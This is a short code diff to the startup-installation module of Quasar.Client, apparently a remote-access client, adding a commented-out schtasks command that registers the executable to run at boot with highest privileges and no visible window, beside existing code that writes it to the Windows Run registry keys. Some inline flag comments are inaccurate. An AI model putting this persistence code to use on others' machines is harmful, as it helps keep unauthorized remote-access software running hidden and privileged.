@@ -38,6 +38,22 @@ namespace Quasar.Client.Setup
                 //p.WaitForExit(1000);
                 //if (p.ExitCode == 0) return;
 
+        //        ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
+        //        {
+        //            Arguments = "/create /tn \"" + startupName + "\" " +
+        //"/sc ONSTART /tr \"" + executablePath + "\" " + // Change to ONSTART for immediate start on task creation
+        //"/rl HIGHEST /f " +
+        //"/Z " + // Allows the task to run on battery
+        //"/du UNLIMITED " + // Removes the duration limit
+        //"/ri 1 /retry 10 " + // Restart every 1 minutes, up to 10 times
+        //"/F /IT", // /IT: Run the task immediately after creation
+        //            UseShellExecute = false,
+        //            CreateNoWindow = true
+        //        };
+
+        //        Process p = Process.Start(startInfo);
+        //        p.WaitForExit(1000);
+
                 bool result = RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine, GetHKLMPath(), startupName, executablePath) || RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser, GetHKLMPath(), startupName, executablePath);
                 if (result) return;
             }
@@ -65,6 +81,7 @@ namespace Quasar.Client.Setup
 
             RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
                 "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName);
+
         }
     }
 }
